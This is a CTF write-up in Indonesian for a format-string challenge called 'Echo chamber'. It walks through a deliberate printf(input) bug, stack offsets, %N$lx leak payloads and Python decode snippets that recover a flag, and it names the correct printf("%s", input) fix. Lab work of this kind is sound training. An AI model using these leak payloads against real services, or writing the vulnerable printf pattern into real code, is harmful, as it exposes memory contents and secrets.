# Writeup CTF: Echo chamber

- **Kategori:** Pwn / Format String Exploitation
- **Tingkat Kesulitan:** Easy - Medium
- **Artefak:** `echo-chamber`, `chall.c`, `README.md`
- **Flag:** `NNS{i_love_how_pR1n7F_t4K3s_tH3_s74Ck_4s_aR6Ument5}`

---

# 1. Deskripsi Tantangan

Challenge memberikan sebuah program yang membaca file:

```
/flag.txt
```

ke dalam buffer lokal stack.

Program kemudian melakukan echo sebanyak 16 kali.

Bug utama terdapat pada penggunaan:

```c
printf(input);
```

bukan:

```c
printf("%s", input);
```

Karena input user langsung digunakan sebagai format string, attacker dapat memasukkan format specifier seperti:

```
%22$016lx
```

untuk membaca isi stack.

Flag tersimpan pada buffer lokal:

```c
char flag[128];
```

sehingga exploit dilakukan dengan:

1. Leak stack.
2. Mengambil qword yang berisi flag.
3. Decode little-endian.

---

# 2. File Challenge

File:

```
README.md
chall.c
echo-chamber
```

Binary:

```
ELF 64-bit x86_64
dynamically linked
not stripped
```

Source code tersedia sehingga bug dapat terlihat langsung.

---

# 3. Analisis Source Code

Bagian penting:

```c
char flag[128], input[128];


setbuf(stdout, NULL);


fgets(
    flag,
    sizeof(flag),
    fopen("/flag.txt","r")
);


for(int i = 0; i < 16; i++)
{
    printf("> ");

    if(!fgets(input,sizeof(input),stdin))
        break;

    printf(input);
}
```

---

# 4. Identifikasi Vulnerability

Masalah utama:

```c
printf(input);
```

Fungsi `printf` menganggap isi input sebagai format string.

Contoh:

Input:

```
AAAA %p %p %p
```

akan diproses menjadi:

```
AAAA 0x1234 0x5678 0xabcd
```

bukan dicetak sebagai teks biasa.

Seharusnya:

```c
printf("%s", input);
```

---

# 5. Layout Stack

Dari source:

```c
char flag[128];

char input[128];
```

Kedua buffer berada pada stack frame `main`.

---

# 6. Analisis Static

Disassembly `main`:

```asm
sub rsp,0x110
```

Membuat ruang stack.

---

## Buffer Flag

```asm
lea rax,[rbp-0x90]

call fgets
```

Alamat:

```
flag[128]
```

berada pada:

```
[rbp-0x90]
```

---

## Buffer Input

```asm
lea rax,[rbp-0x110]

call fgets
```

Alamat:

```
input[128]
```

berada pada:

```
[rbp-0x110]
```

---

## Pemanggilan printf

```asm
lea rax,[rbp-0x110]

mov rdi,rax

call printf
```

Register:

```
RDI = input user
```

langsung diberikan sebagai format string.

---

# 7. Analisis Dynamic

Pengujian lokal menggunakan flag dummy:

```bash
echo 'NNS{local_echo_chamber_test_flag}' > /flag.txt
```

Kemudian dilakukan probing stack:

```
%1$p %2$p %3$p ...
```

Tujuannya mencari posisi stack yang berisi buffer `flag`.

---

# 8. Menentukan Offset Leak

Ditemukan:

```
%22$p
```

menghasilkan:

```
0x61636f6c7b534e4e
```

Jika dibaca little-endian:

```
4e 4e 53 7b 6c 6f 63 61
```

menjadi:

```
NNS{loca
```

Artinya:

```
offset pertama flag = %22$lx
```

---

# 9. Algoritma Leak

Flag dibaca dalam bentuk qword.

Payload:

```
%22$016lx.%23$016lx.%24$016lx....
```

hingga mencakup seluruh buffer.

Contoh:

```
%22$016lx.%23$016lx.%24$016lx.%25$016lx
```

---

Setiap nilai hexadecimal dikonversi:

```python
int(value,16)
```

kemudian:

```python
.to_bytes(
    8,
    "little"
)
```

Karena data berada dalam memory x86-64 little-endian.

---

# 10. Decode Flag

Contoh:

Hex leak:

```
61636f6c7b534e4e
```

Konversi:

```python
bytes.fromhex()
```

atau:

```python
int(
    hex_value,
    16
).to_bytes(
    8,
    "little"
)
```

Hasil:

```
NNS{loca
```

Seluruh qword digabung:

```
NNS{...}
```

---

# 11. Penyusunan Solver

File:

```
solve_Echo_chamber.py
```

melakukan:

1. Membuat koneksi remote.
2. Mengirim payload format string.
3. Mengambil output leak.
4. Decode qword.
5. Mengambil string flag.
6. Menampilkan hasil.

---

# 12. Payload Generator

Contoh:

```python
payload = ".".join(
    f"%{i}$016lx"
    for i in range(22,38)
)
```

Payload membaca:

```
stack argument 22 sampai 37
```

---

# 13. Decode Script

Contoh:

```python
leak = response.split(
    b"LEAK:"
)[1]


words = leak.split(b".")


flag = b""


for w in words:

    value = int(w,16)

    flag += value.to_bytes(
        8,
        "little"
    )


print(flag.split(b"\x00")[0])
```

---

# 14. Cara Menjalankan

## Remote Non SSL

```bash
python3 solve_Echo_chamber.py HOST PORT
```

---

## Remote SSL/TLS

```bash
python3 solve_Echo_chamber.py HOST PORT --ssl
```

---

## Local Test

Buat flag dummy:

```bash
echo 'NNS{local_echo_chamber_test_flag}' > /flag.txt
```

Jalankan:

```bash
python3 solve_Echo_chamber.py --local ./echo-chamber
```

Output:

```text
<FLAG>NNS{local_echo_chamber_test_flag}</FLAG>
```

---

# 15. Hasil Remote

Setelah exploit berhasil:

```
NNS{i_love_how_pR1n7F_t4K3s_tH3_s74Ck_4s_aR6Ument5}
```

---

# 16. Kesimpulan

Challenge ini memanfaatkan vulnerability:

```
Format String Bug
```

Kesalahan utama:

```c
printf(input);
```

memungkinkan user mengontrol format string.

Dengan menggunakan:

```
%N$lx
```

attacker dapat membaca nilai arbitrary dari stack.

Karena flag sudah berada di stack sebelum loop echo dimulai, exploit cukup melakukan:

```
Leak stack
        |
        v
Ambil qword flag
        |
        v
Decode little-endian
        |
        v
Dapatkan flag
```

Flag berhasil diperoleh:

```
NNS{i_love_how_pR1n7F_t4K3s_tH3_s74Ck_4s_aR6Ument5}
```
